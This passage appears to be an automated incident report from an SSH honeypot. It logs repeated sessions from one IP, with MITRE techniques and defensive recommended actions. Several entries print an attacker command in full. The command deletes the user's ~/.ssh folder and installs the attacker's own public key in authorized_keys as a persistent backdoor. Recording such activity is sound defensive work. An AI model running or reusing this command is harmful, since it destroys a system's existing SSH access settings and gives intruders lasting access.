| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:03 |
| **Last Seen** | 2026-04-11 16:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:03:48` | `cowrie.session.connect` |
| `2026-04-11 16:03:48` | `cowrie.client.version` |
| `2026-04-11 16:03:48` | `cowrie.client.kex` |
| `2026-04-11 16:03:48` | `cowrie.login.success` |
| `2026-04-11 16:03:49` | `cowrie.session.params` |
| `2026-04-11 16:03:49` | `cowrie.command.input` |
| `2026-04-11 16:03:49` | `cowrie.command.failed` |
| `2026-04-11 16:03:49` | `cowrie.log.closed` |
| `2026-04-11 16:03:49` | `cowrie.session.params` |
| `2026-04-11 16:03:49` | `cowrie.command.input` |
| `2026-04-11 16:03:49` | `cowrie.session.file_download` |
| `2026-04-11 16:03:49` | `cowrie.log.closed` |
| `2026-04-11 16:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525a5d6c35d9

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:03 |
| **Last Seen** | 2026-04-11 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:03:51` | `cowrie.session.connect` |
| `2026-04-11 16:03:51` | `cowrie.client.version` |
| `2026-04-11 16:03:52` | `cowrie.client.kex` |
| `2026-04-11 16:03:52` | `cowrie.login.success` |
| `2026-04-11 16:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02eb44bb2c7

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:05 |
| **Last Seen** | 2026-04-11 16:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:05:34` | `cowrie.session.connect` |
| `2026-04-11 16:05:34` | `cowrie.client.version` |
| `2026-04-11 16:05:34` | `cowrie.client.kex` |
| `2026-04-11 16:05:34` | `cowrie.login.success` |
| `2026-04-11 16:05:35` | `cowrie.session.params` |
| `2026-04-11 16:05:35` | `cowrie.command.input` |
| `2026-04-11 16:05:35` | `cowrie.command.failed` |
| `2026-04-11 16:05:35` | `cowrie.log.closed` |
| `2026-04-11 16:05:35` | `cowrie.session.params` |
| `2026-04-11 16:05:35` | `cowrie.command.input` |
| `2026-04-11 16:05:35` | `cowrie.session.file_download` |
| `2026-04-11 16:05:35` | `cowrie.log.closed` |
| `2026-04-11 16:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3c553dd7be

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:05 |
| **Last Seen** | 2026-04-11 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:05:37` | `cowrie.session.connect` |
| `2026-04-11 16:05:37` | `cowrie.client.version` |
| `2026-04-11 16:05:37` | `cowrie.client.kex` |
| `2026-04-11 16:05:38` | `cowrie.login.success` |
| `2026-04-11 16:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d568740ce87a

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:07 |
| **Last Seen** | 2026-04-11 16:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:07:16` | `cowrie.session.connect` |
| `2026-04-11 16:07:16` | `cowrie.client.version` |
| `2026-04-11 16:07:16` | `cowrie.client.kex` |
| `2026-04-11 16:07:17` | `cowrie.login.success` |
| `2026-04-11 16:07:17` | `cowrie.session.params` |
| `2026-04-11 16:07:17` | `cowrie.command.input` |
| `2026-04-11 16:07:17` | `cowrie.command.failed` |
| `2026-04-11 16:07:17` | `cowrie.log.closed` |
| `2026-04-11 16:07:18` | `cowrie.session.params` |
| `2026-04-11 16:07:18` | `cowrie.command.input` |
| `2026-04-11 16:07:18` | `cowrie.session.file_download` |
| `2026-04-11 16:07:18` | `cowrie.log.closed` |
| `2026-04-11 16:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba6c0854977

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:07 |
| **Last Seen** | 2026-04-11 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:07:20` | `cowrie.session.connect` |
| `2026-04-11 16:07:20` | `cowrie.client.version` |
| `2026-04-11 16:07:20` | `cowrie.client.kex` |
| `2026-04-11 16:07:21` | `cowrie.login.success` |
| `2026-04-11 16:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42897adad673

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:14 |
| **Last Seen** | 2026-04-11 16:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:14:05` | `cowrie.session.connect` |
| `2026-04-11 16:14:05` | `cowrie.client.version` |
| `2026-04-11 16:14:05` | `cowrie.client.kex` |
| `2026-04-11 16:14:05` | `cowrie.login.success` |
| `2026-04-11 16:14:06` | `cowrie.session.params` |
| `2026-04-11 16:14:06` | `cowrie.command.input` |
| `2026-04-11 16:14:06` | `cowrie.command.failed` |
| `2026-04-11 16:14:06` | `cowrie.log.closed` |
| `2026-04-11 16:14:06` | `cowrie.session.params` |
| `2026-04-11 16:14:06` | `cowrie.command.input` |
| `2026-04-11 16:14:06` | `cowrie.session.file_download` |
| `2026-04-11 16:14:06` | `cowrie.log.closed` |
| `2026-04-11 16:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62e2dca483c

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:14 |
| **Last Seen** | 2026-04-11 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:14:08` | `cowrie.session.connect` |
| `2026-04-11 16:14:08` | `cowrie.client.version` |
| `2026-04-11 16:14:08` | `cowrie.client.kex` |
| `2026-04-11 16:14:09` | `cowrie.login.success` |
| `2026-04-11 16:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184c3f8228b2

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:15 |
| **Last Seen** | 2026-04-11 16:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:15:45` | `cowrie.session.connect` |
| `2026-04-11 16:15:45` | `cowrie.client.version` |
| `2026-04-11 16:15:45` | `cowrie.client.kex` |
| `2026-04-11 16:15:46` | `cowrie.login.success` |
| `2026-04-11 16:15:46` | `cowrie.session.params` |
| `2026-04-11 16:15:46` | `cowrie.command.input` |
| `2026-04-11 16:15:46` | `cowrie.command.failed` |
| `2026-04-11 16:15:46` | `cowrie.log.closed` |
| `2026-04-11 16:15:47` | `cowrie.session.params` |
| `2026-04-11 16:15:47` | `cowrie.command.input` |
| `2026-04-11 16:15:47` | `cowrie.session.file_download` |
| `2026-04-11 16:15:47` | `cowrie.log.closed` |
| `2026-04-11 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b7205760019

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:15 |
| **Last Seen** | 2026-04-11 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:15:49` | `cowrie.session.connect` |
| `2026-04-11 16:15:49` | `cowrie.client.version` |
| `2026-04-11 16:15:49` | `cowrie.client.kex` |
| `2026-04-11 16:15:50` | `cowrie.login.success` |
| `2026-04-11 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4edcbfb3f90c

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:17 |
| **Last Seen** | 2026-04-11 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:17:28` | `cowrie.session.connect` |
| `2026-04-11 16:17:28` | `cowrie.client.version` |
| `2026-04-11 16:17:28` | `cowrie.client.kex` |
| `2026-04-11 16:17:29` | `cowrie.login.success` |
| `2026-04-11 16:17:29` | `cowrie.session.params` |
| `2026-04-11 16:17:29` | `cowrie.command.input` |
| `2026-04-11 16:17:29` | `cowrie.command.failed` |
| `2026-04-11 16:17:29` | `cowrie.log.closed` |
| `2026-04-11 16:17:30` | `cowrie.session.params` |
| `2026-04-11 16:17:30` | `cowrie.command.input` |
| `2026-04-11 16:17:30` | `cowrie.session.file_download` |
| `2026-04-11 16:17:30` | `cowrie.log.closed` |
| `2026-04-11 16:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4ab1f18221

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:17 |
| **Last Seen** | 2026-04-11 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:17:32` | `cowrie.session.connect` |
| `2026-04-11 16:17:32` | `cowrie.client.version` |
| `2026-04-11 16:17:32` | `cowrie.client.kex` |
| `2026-04-11 16:17:33` | `cowrie.login.success` |
| `2026-04-11 16:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c34551bb030

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:20 |
| **Last Seen** | 2026-04-11 16:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:20:56` | `cowrie.session.connect` |
| `2026-04-11 16:20:56` | `cowrie.client.version` |
| `2026-04-11 16:20:56` | `cowrie.client.kex` |
| `2026-04-11 16:20:56` | `cowrie.login.success` |
| `2026-04-11 16:20:57` | `cowrie.session.params` |
| `2026-04-11 16:20:57` | `cowrie.command.input` |
| `2026-04-11 16:20:57` | `cowrie.command.failed` |
| `2026-04-11 16:20:57` | `cowrie.log.closed` |
| `2026-04-11 16:20:57` | `cowrie.session.params` |
| `2026-04-11 16:20:57` | `cowrie.command.input` |
| `2026-04-11 16:20:57` | `cowrie.session.file_download` |
| `2026-04-11 16:20:57` | `cowrie.log.closed` |
| `2026-04-11 16:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7e165d4181

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:20 |
| **Last Seen** | 2026-04-11 16:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:20:59` | `cowrie.session.connect` |
| `2026-04-11 16:20:59` | `cowrie.client.version` |
| `2026-04-11 16:20:59` | `cowrie.client.kex` |
| `2026-04-11 16:21:00` | `cowrie.login.success` |
| `2026-04-11 16:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6986b76704

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:22 |
| **Last Seen** | 2026-04-11 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:22:46` | `cowrie.session.connect` |
| `2026-04-11 16:22:46` | `cowrie.client.version` |
| `2026-04-11 16:22:46` | `cowrie.client.kex` |
| `2026-04-11 16:22:46` | `cowrie.login.success` |
| `2026-04-11 16:22:47` | `cowrie.session.params` |
| `2026-04-11 16:22:47` | `cowrie.command.input` |
| `2026-04-11 16:22:47` | `cowrie.command.failed` |
| `2026-04-11 16:22:47` | `cowrie.log.closed` |
| `2026-04-11 16:22:47` | `cowrie.session.params` |
| `2026-04-11 16:22:47` | `cowrie.command.input` |
| `2026-04-11 16:22:47` | `cowrie.session.file_download` |
| `2026-04-11 16:22:47` | `cowrie.log.closed` |
| `2026-04-11 16:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3988c15d2fbc

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:22 |
| **Last Seen** | 2026-04-11 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:22:49` | `cowrie.session.connect` |
| `2026-04-11 16:22:49` | `cowrie.client.version` |
| `2026-04-11 16:22:50` | `cowrie.client.kex` |
| `2026-04-11 16:22:50` | `cowrie.login.success` |
| `2026-04-11 16:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7302912ad0

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-04-11 16:24 |
| **Last Seen** | 2026-04-11 16:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 16:24:35` | `cowrie.session.connect` |
